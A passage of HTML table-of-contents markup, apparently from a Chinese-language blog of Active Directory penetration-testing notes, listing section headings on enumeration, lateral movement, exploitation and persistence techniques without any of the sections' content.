class="toc-number">3.3.1.</span> <span class="toc-text">Server Message Block (SMB)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LLMNR-NBT-NS-and-WPAD"><span class="toc-number">3.3.2.</span> <span class="toc-text">LLMNR, NBT-NS, and WPAD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%A6%E6%88%AA-NetNTLM"><span class="toc-number">3.3.3.</span> <span class="toc-text">拦截 NetNTLM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-Relay-%E4%B8%AD%E7%BB%A7"><span class="toc-number">3.3.4.</span> <span class="toc-text">SMB Relay 中继</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%AE%E8%BD%AF%E9%83%A8%E7%BD%B2%E5%B7%A5%E5%85%B7%E5%8C%85"><span class="toc-number">3.4.</span> <span class="toc-text">微软部署工具包</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6%E4%B8%AD%E6%8F%90%E5%8F%96%E5%87%AD%E6%8D%AE"><span class="toc-number">3.4.1.</span> <span class="toc-text">从镜像文件中提取凭据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">3.5.</span> <span class="toc-text">配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E8%BF%88%E5%85%8B%E8%8F%B2%E6%9D%80%E6%AF%92%E4%B8%AD%E6%8F%90%E5%8F%96%E5%87%AD%E6%8D%AE"><span class="toc-number">3.6.</span> <span class="toc-text">从迈克菲杀毒中提取凭据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DLC-Python-%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83"><span class="toc-number">3.6.1.</span> <span class="toc-text">DLC - Python 虚拟环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.7.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumerating-Active-Directory"><span class="toc-number">4.</span> <span class="toc-text">Enumerating Active Directory</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AD%E6%8D%AE%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.</span> <span class="toc-text">凭据注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-%E8%A7%A3%E6%9E%90%E4%B8%8D%E5%88%B0%E5%9F%9F%E6%8E%A7"><span class="toc-number">4.1.1.</span> <span class="toc-text">DNS 解析不到域控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP-%E5%92%8C-%E5%9F%9F%E5%90%8D"><span class="toc-number">4.1.2.</span> <span class="toc-text">IP 和 域名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration-%E6%9E%9A%E4%B8%BE"><span class="toc-number">4.2.</span> <span class="toc-text">Enumeration 枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MMC"><span class="toc-number">4.2.1.</span> <span class="toc-text">MMC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD"><span class="toc-number">4.2.2.</span> <span class="toc-text">CMD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell"><span class="toc-number">4.2.3.</span> <span class="toc-text">PowerShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bloodhound"><span class="toc-number">4.2.4.</span> <span class="toc-text">Bloodhound</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">4.3.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%9A%84%E6%9E%9A%E4%B8%BE%E6%8A%80%E6%9C%AF"><span class="toc-number">4.3.1.</span> <span class="toc-text">其他的枚举技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-number">4.3.2.</span> <span class="toc-text">缓解措施</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lateral-Movement-and-Pivoting"><span class="toc-number">5.</span> <span class="toc-text">Lateral Movement and Pivoting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E8%BF%9B%E7%A8%8B"><span class="toc-number">5.1.</span> <span class="toc-text">远程执行进程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Psexec"><span class="toc-number">5.1.1.</span> <span class="toc-text">Psexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-WinRM-%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B"><span class="toc-number">5.1.2.</span> <span class="toc-text">使用 WinRM 创建远程进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-sc-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">5.1.3.</span> <span class="toc-text">通过 sc 远程创建服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sc-%E7%9A%84%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">5.1.3.1.</span> <span class="toc-text">sc 的连接过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-schtasks-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">5.1.4.</span> <span class="toc-text">通过 schtasks 远程创建计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5"><span class="toc-number">5.1.5.</span> <span class="toc-text">实践</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-WMI-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">5.2.</span> <span class="toc-text">通过 WMI 横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-PowerShell-%E8%BF%9E%E6%8E%A5-WMI"><span class="toc-number">5.2.1.</span> <span class="toc-text">通过 PowerShell 连接 WMI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-WMI-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B"><span class="toc-number">5.2.1.1.</span> <span class="toc-text">通过 WMI 远程创建进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-WMI-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">5.2.1.2.</span> <span class="toc-text">通过 WMI 远程创建服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-WMI-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">5.2.1.3.</span> <span class="toc-text">通过 WMI 远程创建计划任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-WMI-%E5%AE%89%E8%A3%85-MSI-%E5%8C%85"><span class="toc-number">5.2.1.4.</span> <span class="toc-text">通过 WMI 安装 MSI 包</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5-1"><span class="toc-number">5.2.2.</span> <span class="toc-text">实践</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%9B%BF%E4%BB%A3%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%9D%90%E6%96%99"><span class="toc-number">5.3.</span> <span class="toc-text">使用替代身份验证材料</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Authentication"><span class="toc-number">5.3.1.</span> <span class="toc-text">NTLM Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-the-Hash-%E4%BC%A0%E9%80%92-Hash"><span class="toc-number">5.3.2.</span> <span class="toc-text">Pass-the-Hash 传递 Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Passing-the-Hash-Using-Linux"><span class="toc-number">5.3.2.1.</span> <span class="toc-text">Passing the Hash Using Linux</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos-%E8%AE%A4%E8%AF%81"><span class="toc-number">5.4.</span> <span class="toc-text">Kerberos 认证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="toc-number">5.4.1.</span> <span class="toc-text">认证过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E7%AE%80%E8%BF%B0"><span class="toc-number">5.4.1.1.</span> <span class="toc-text">认证过程简述</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-the-Ticket-%E4%BC%A0%E9%80%92%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.4.2.</span> <span class="toc-text">Pass-the-Ticket 传递票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overpass-the-hash-Pass-the-Key"><span class="toc-number">5.4.3.</span> <span class="toc-text">Overpass-the-hash &#x2F; Pass-the-Key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5-2"><span class="toc-number">5.4.4.</span> <span class="toc-text">实践</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA"><span class="toc-number">5.5.</span> <span class="toc-text">滥用用户行为</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E5%8F%AF%E5%86%99%E5%85%B1%E4%BA%AB"><span class="toc-number">5.5.1.</span> <span class="toc-text">滥用可写共享</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E9%97%A8-VBS-%E8%84%9A%E6%9C%AC"><span class="toc-number">5.5.1.1.</span> <span class="toc-text">后门 VBS 脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E9%97%A8-EXE-%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.5.1.2.</span> <span class="toc-text">后门 EXE 程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RDP-%E5%8A%AB%E6%8C%81"><span class="toc-number">5.5.1.3.</span> <span class="toc-text">RDP 劫持</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">5.6.</span> <span class="toc-text">端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-%E9%9A%A7%E9%81%93"><span class="toc-number">5.6.1.</span> <span class="toc-text">SSH 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">5.6.1.1.</span> <span class="toc-text">SSH 远程端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">5.6.1.2.</span> <span class="toc-text">SSH 本地端口转发</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#socat-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">5.6.2.</span> <span class="toc-text">socat 端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C-SOCKS"><span class="toc-number">5.6.3.</span> <span class="toc-text">动态端口转发和 SOCKS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RDP-%E8%BD%AC%E5%8F%91%E5%AE%9E%E8%B7%B5"><span class="toc-number">5.6.4.</span> <span class="toc-text">RDP 转发实践</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E5%A4%8D%E6%9D%82%E5%88%A9%E7%94%A8"><span class="toc-number">5.6.5.</span> <span class="toc-text">隧道复杂利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">5.7.</span> <span class="toc-text">拓展</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploiting-Active-Directory"><span class="toc-number">6.</span> <span class="toc-text">Exploiting Active Directory</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Permission-Delegation"><span class="toc-number">6.1.</span> <span class="toc-text">Exploiting Permission Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ACEs"><span class="toc-number">6.1.1.</span> <span class="toc-text">ACEs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bloodhound-1"><span class="toc-number">6.1.2.</span> <span class="toc-text">Bloodhound</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AddMember"><span class="toc-number">6.1.2.1.</span> <span class="toc-text">AddMember</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%BA%E5%88%B6%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">6.1.2.2.</span> <span class="toc-text">强制改密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Kerberos-Delegation"><span class="toc-number">6.2.</span> <span class="toc-text">Exploiting Kerberos Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-Double-Hop-issue"><span class="toc-number">6.2.1.</span> <span class="toc-text">Kerberos Double Hop issue</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E5%A7%8B-Kerberos-%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-number">6.2.1.1.</span> <span class="toc-text">原始 Kerberos 协议的局限性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%83%BD%E7%AE%80%E5%8D%95%E5%9C%B0%E8%BD%AC%E5%8F%91-TGS%EF%BC%9F"><span class="toc-number">6.2.1.2.</span> <span class="toc-text">为什么不能简单地转发 TGS？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9AKerberos-%E5%A7%94%E6%B4%BE%EF%BC%88Kerberos-Delegation%EF%BC%89"><span class="toc-number">6.2.1.3.</span> <span class="toc-text">解决方案：Kerberos 委派（Kerberos Delegation）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Constrained-vs-Unconstrained"><span class="toc-number">6.2.2.</span> <span class="toc-text">Constrained vs Unconstrained</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%92%E5%85%85%E8%BF%87%E7%A8%8B%EF%BC%88%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%EF%BC%89"><span class="toc-number">6.2.2.1.</span> <span class="toc-text">冒充过程（攻击流程）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%9D%9E%E6%95%8F%E6%84%9F%E7%9A%84%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%EF%BC%9F"><span class="toc-number">6.2.2.2.</span> <span class="toc-text">什么是非敏感的用户账户？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Resource-Based-Constrained-Delegation"><span class="toc-number">6.2.3.</span> <span class="toc-text">Resource-Based Constrained Delegation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">6.2.4.</span> <span class="toc-text">三种委派的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE-Unconstrained-Delegation"><span class="toc-number">6.2.4.1.</span> <span class="toc-text">非约束性委派 (Unconstrained Delegation)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE-Constrained-Delegation"><span class="toc-number">6.2.4.2.</span> <span class="toc-text">约束性委派 (Constrained Delegation)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE-Resource-Based-Constrained-Delegation-RBCD"><span class="toc-number">6.2.4.3.</span> <span class="toc-text">基于资源的约束性委派 (Resource-Based Constrained Delegation, RBCD)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E8%A1%A8%E6%A0%BC"><span class="toc-number">6.2.4.4.</span> <span class="toc-text">总结表格</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5-3"><span class="toc-number">6.2.5.</span> <span class="toc-text">实践</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A8%E8%8D%90%E9%98%85%E8%AF%BB"><span class="toc-number">6.2.6.</span> <span class="toc-text">推荐阅读</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Relays"><span class="toc-number">6.3.</span> <span class="toc-text">Exploiting Relays</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E6%9C%BA-Bug"><span class="toc-number">6.3.1.</span> <span class="toc-text">打印机 Bug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-%E7%AD%BE%E5%90%8D"><span class="toc-number">6.3.2.</span> <span class="toc-text">SMB 签名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-AD-Users"><span class="toc-number">6.4.</span> <span class="toc-text">Exploiting AD Users</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%AF%86%E7%A0%81%E7%AE%A1%E7%90%86%E5%99%A8%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">6.4.1.</span> <span class="toc-text">寻找密码管理器数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%AF%86%E7%A0%81%E7%AE%A1%E7%90%86%E5%99%A8%E4%B8%BB%E5%AF%86%E7%A0%81"><span class="toc-number">6.4.2.</span> <span class="toc-text">寻找密码管理器主密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-GPO"><span class="toc-number">6.5.</span> <span class="toc-text">Exploiting GPO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E5%AF%B9%E8%B1%A1%EF%BC%88GPO%EF%BC%89"><span class="toc-number">6.5.1.</span> <span class="toc-text">组策略对象（GPO）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPO-%E7%9A%84%E5%AD%98%E5%82%A8%E4%B8%8E%E5%BA%94%E7%94%A8"><span class="toc-number">6.5.2.</span> <span class="toc-text">GPO 的存储与应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-GPOs"><span class="toc-number">6.5.3.</span> <span class="toc-text">Exploiting GPOs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Certificates"><span class="toc-number">6.6.</span> <span class="toc-text">Exploiting Certificates</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AF%81%E4%B9%A6%E6%A8%A1%E6%9D%BF"><span class="toc-number">6.6.1.</span> <span class="toc-text">利用证书模板</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6"><span class="toc-number">6.6.1.1.</span> <span class="toc-text">伪造证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-LDAP-%E8%BF%9B%E8%A1%8C%E8%AE%A4%E8%AF%81"><span class="toc-number">6.6.1.2.</span> <span class="toc-text">使用 LDAP 进行认证</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">6.6.2.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Domain-Trusts"><span class="toc-number">6.7.</span> <span class="toc-text">Exploiting Domain Trusts</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KRBTGT-and-Golden-Tickets"><span class="toc-number">6.7.1.</span> <span class="toc-text">KRBTGT and Golden Tickets</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.7.1.1.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dcysnc-%E6%94%BB%E5%87%BB"><span class="toc-number">6.7.1.2.</span> <span class="toc-text">dcysnc 攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Inter-Realm-TGTs"><span class="toc-number">6.7.2.</span> <span class="toc-text">Inter-Realm TGTs</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E5%9F%9F%E4%BF%A1%E4%BB%BB"><span class="toc-number">6.7.2.1.</span> <span class="toc-text">滥用域信任</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">6.8.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E9%98%85%E8%AF%BB"><span class="toc-number">6.9.</span> <span class="toc-text">拓展阅读</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Persisting-Active-Directory"><span class="toc-number">7.</span> <span class="toc-text">Persisting Active Directory</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Persistence-through-Credentials"><span class="toc-number">7.1.</span> <span class="toc-text">Persistence through Credentials</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8C%E6%AD%A5%EF%BC%88DC-Sync%EF%BC%89"><span class="toc-number">7.1.1.</span> <span class="toc-text">域同步（DC Sync）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%AD%E6%8D%AE%E5%B9%B6%E9%9D%9E%E9%83%BD%E4%B8%80%E6%A0%B7"><span class="toc-number">7.1.2.</span> <span class="toc-text">凭据并非都一样</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Persistence-through-Tickets"><span class="toc-number">7.2.</span> <span class="toc-text">Persistence through Tickets</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-%E8%AE%A4%E8%AF%81%E5%9F%BA%E7%A1%80"><span class="toc-number">7.2.1.</span> <span class="toc-text">Kerberos 认证基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%88Golden-Tickets%EF%BC%89"><span class="toc-number">7.2.2.</span> <span class="toc-text">黄金票据（Golden Tickets）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%EF%BC%88Silver-Tickets%EF%BC%89"><span class="toc-number">7.2.3.</span> <span class="toc-text">白银票据（Silver Tickets）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E7%A5%A8%E6%8D%AE%E5%AE%9E%E8%B7%B5"><span class="toc-number">7.2.4.</span> <span class="toc-text">伪造票据实践</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Persistence-through-Certificates"><span class="toc-number">7.3.</span> <span class="toc-text">Persistence through Certificates</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E7%A7%81%E9%92%A5"><span class="toc-number">7.3.1.</span> <span class="toc-text">提取私钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%92%8C%E4%BD%BF%E7%94%A8%E8%AF%81%E4%B9%A6"><span class="toc-number">7.3.2.</span> <span class="toc-text">生成和使用证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E4%B8%8D%E5%86%8D%E6%98%AF%E8%93%9D%E9%98%9F%E7%9A%84%E6%9C%8B%E5%8F%8B"><span class="toc-number">7.3.3.</span> <span class="toc-text">我们不再是蓝队的朋友</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E9%98%85%E8%AF%BB-1"><span class="toc-number">7.3.4.</span> <span class="toc-text">拓展阅读</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Persistence-through-SID-History"><span class="toc-number">7.4.</span> <span class="toc-text">Persistence through SID History</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SID-History-%E8%83%BD%E8%AE%A9%E6%88%91%E4%BB%AC%E4%B8%BA%E6%89%80%E6%AC%B2%E4%B8%BA"><span class="toc-number">7.4.1.</span> <span class="toc-text">SID History 能让我们为所欲为</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E5%8E%86%E5%8F%B2"><span class="toc-number">7.4.2.</span> <span class="toc-text">伪造历史</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%93%9D%E9%98%9F%E7%9A%84%E6%80%92%E7%81%AB%E4%B8%8E%E6%97%A0%E5%8A%9B"><span class="toc-number">7.4.3.</span> <span class="toc-text">蓝队的怒火与无力</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Persistence-through-Group-Membership"><span class="toc-number">7.5.</span> <span class="toc-text">Persistence through Group Membership</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B5%8C%E5%A5%97%E7%BB%84"><span class="toc-number">7.5.1.</span> <span class="toc-text">嵌套组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%97%E5%A8%83"><span class="toc-number">7.5.2.</span> <span class="toc-text">套娃</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Persistence-through-ACLs"><span class="toc-number">7.6.</span> <span class="toc-text">Persistence through ACLs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-AD-%E7%BB%84%E6%A8%A1%E6%9D%BF%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">7.6.1.</span> <span class="toc-text">通过 AD 组模板进行持久化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-AdminSDHolder-%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">7.6.2.</span> <span class="toc-text">使用 AdminSDHolder 持久化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SDProp"><span class="toc-number">7.6.3.</span> <span class="toc-text">SDProp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E8%93%9D%E9%98%9F%E6%9D%A5%E8%AF%B4%E7%AE%80%E7%9B%B4%E6%98%AF%E9%9B%AA%E4%B8%8A%E5%8A%A0%E9%9C%9C"><span class="toc-number">7.6.4.</span> <span class="toc-text">对蓝队来说简直是雪上加霜</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Persistence-through-GPOs"><span class="toc-number">7.7.</span> <span class="toc-text">Persistence through GPOs</span></a><ol class="toc-child"><li 